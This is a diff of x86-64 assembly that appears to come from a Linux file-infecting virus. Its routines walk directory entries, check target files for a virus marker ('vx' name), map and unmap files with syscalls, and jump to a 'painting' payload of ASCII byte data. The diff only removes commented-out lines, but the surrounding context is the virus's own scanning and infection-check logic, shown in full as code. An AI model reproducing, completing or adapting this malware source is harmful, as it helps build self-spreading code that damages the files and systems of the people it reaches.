@@ -389,23 +389,10 @@ check_file:
 		mov [r14 + 144], rax
 		xor r12, r12
 	.copy_filename:
-		;mov rsi, rdi
 		lea rdi, [r14 + 200] 
 		lea rsi, [rcx + r14 + 618]
 		mov qword [rdi], rsi
-		;.copy_filename_loop:
-		;	mov byte al, [rsi]
-		;	mov byte [rdi], al
-		;	inc rsi
-		;	inc rdi
-			;movsb
-			;cmp byte al, 0x0
-			;jne .copy_filename_loop
-		;	cmp byte [rsi], 0x0
-		;	jne .copy_filename_loop
-		;mov byte [rdi], 0x0
 		xor rax, rax
-		;mov byte [rdi], al
 		xor r12, r12
 		jmp get_vx_name
 	check_vx_name:
@@ -500,20 +487,10 @@ check_file:
 		mov rax, 0xB ;SYS_MUNMAP
 		syscall
 
-	;workaround to ensure that filename stored at r14 + 200
-	;is cleared after each iteration of check_file
-	;so that target filename does not retain leftover chars
-	;from previous filename save
-		;lea rdi, [r14 + 200]
-		;xor rax, rax
-		;mov rax, "x\0"
-		;mov qword [rdi], rax
-
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jl check_file
-		;jmp painting
 	painting:
 	call payload
 		db 0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f
